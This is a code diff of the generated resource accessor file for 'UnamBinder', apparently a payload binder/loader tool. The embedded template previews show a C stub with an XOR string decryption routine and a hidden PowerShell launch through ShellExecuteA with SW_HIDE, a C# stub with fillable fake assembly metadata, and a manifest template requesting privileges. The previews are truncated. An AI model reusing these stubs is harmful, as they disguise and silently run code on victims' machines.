@@ -63,9 +63,9 @@ namespace UnamBinder.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        internal static byte[] administrator {
+        internal static byte[] Compilers {
             get {
-                object obj = ResourceManager.GetObject("administrator", resourceCulture);
+                object obj = ResourceManager.GetObject("Compilers", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -81,31 +81,59 @@ namespace UnamBinder.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
+        ///   Looks up a localized string similar to #include &lt;stdio.h&gt;
+        ///#include &lt;stdlib.h&gt;
+        ///#include &lt;windows.h&gt;
+        ///#include &lt;ShellAPI.h&gt;
+        ///
+        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
+        ///
+        ///char* _rCipher_(char* data, long dataLen) {
+        ///	char* output = (char*)malloc(sizeof(char) * dataLen+1);
+        ///	output[dataLen] = 0;
+        ///	for (int i = 0; i &lt; dataLen; ++i) {
+        ///		output[i] = data[i] ^ &quot;#DKEY&quot;[i % #DKEYLENGTH];
+        ///	}
+        ///	return output;
+        ///}
+        ///
+        ///int main(int argc, char **argv) 
+        ///{
+        ///#if DefError
+        ///	ShellExecuteA(NULL, &quot;#STROPEN&quot;, &quot;#STRPOWERSHELL&quot;, &quot;#ERRORCOMMAND&quot;, NULL, SW_HIDE);
+        ///#e [rest of string was truncated]&quot;;.
         /// </summary>
-        internal static byte[] MinGW64 {
+        internal static string ProgramC {
             get {
-                object obj = ResourceManager.GetObject("MinGW64", resourceCulture);
-                return ((byte[])(obj));
+                return ResourceManager.GetString("ProgramC", resourceCulture);
             }
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to #include &lt;direct.h&gt;
-        ///#include &lt;stdio.h&gt;
-        ///#include &lt;stdlib.h&gt;
-        ///#include &lt;windows.h&gt;
+        ///   Looks up a localized string similar to using System;
+        ///using System.IO;
+        ///using System.Text;
+        ///using System.Threading;
+        ///using System.Diagnostics;
+        ///#if DefAssembly
+        ///using System.Reflection;
         ///
-        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
+        ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
+        ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
+        ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+        ///[assembly: AssemblyProduct(&quot;%Product%&quot;)]
+        ///[assembly: AssemblyCopyright(&quot;%Copyright%&quot;)]
+        ///[assembly: AssemblyTrademark(&quot;%Trademark%&quot;)]
+        ///[assembly: AssemblyFileVersion(&quot;%Version%&quot;)]
+        ///#endif
         ///
-        ///char base46_map[] = {&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;,
-        ///                     &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;,
-        ///                     &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;,
-        ///                     &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apo....
+        ///namespace _rProgram_
+        ///{
+        ///    class _rProgr [rest of string was truncated]&quot;;.
         /// </summary>
-        internal static string Program1 {
+        internal static string ProgramCS {
             get {
-                return ResourceManager.GetString("Program1", resourceCulture);
+                return ResourceManager.GetString("ProgramCS", resourceCulture);
             }
         }
         
@@ -113,23 +141,23 @@ namespace UnamBinder.Properties {
         ///   Looks up a localized string similar to #ifdef DefIcon
         ///MAINICON ICON &quot;#ICON&quot;
         ///#endif
-        ///#ifdef DefAdmin
-        ///1 24 &quot;administrator.manifest&quot;
-        ///#endif
+        ///1 24 &quot;loader.manifest&quot;
         ///#ifdef DefAssembly
-        ///VS_VERSION_INFO VERSIONINFO
+        ///1 VERSIONINFO
+        ///FILEVERSION     #VERSION
+        ///PRODUCTVERSION  #VERSION
         ///BEGIN
         ///    BLOCK &quot;StringFileInfo&quot;
         ///    BEGIN
         ///        BLOCK &quot;040904b0&quot;
         ///        BEGIN
         ///            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
-        ///			VALUE &quot;FileTITLE&quot;, &quot;#TITLE&quot;
+        ///			VALUE &quot;FileTitle&quot;, &quot;#TITLE&quot;
         ///            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
         ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
         ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
-        ///        [rest of string was truncated]&quot;;.
+        ///  [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string resource {
             get {
@@ -138,12 +166,17 @@ namespace UnamBinder.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 
+        ///&lt;asmv1:assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv1=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv2=&quot;urn:schemas-microsoft-com:asm.v2&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+        ///    &lt;assemblyIdentity version=&quot;#MANIFESTVERSION&quot; name=&quot;#MANIFESTNAME&quot; /&gt;
+        ///    &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
+        ///        &lt;security&gt;
+        ///            &lt;requestedPrivileges xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
+        ///                &lt;re [rest of string was truncated]&quot;;.
         /// </summary>
-        internal static byte[] tinycc {
+        internal static string template {
             get {
-                object obj = ResourceManager.GetObject("tinycc", resourceCulture);
-                return ((byte[])(obj));
+                return ResourceManager.GetString("template", resourceCulture);
             }
         }
     }
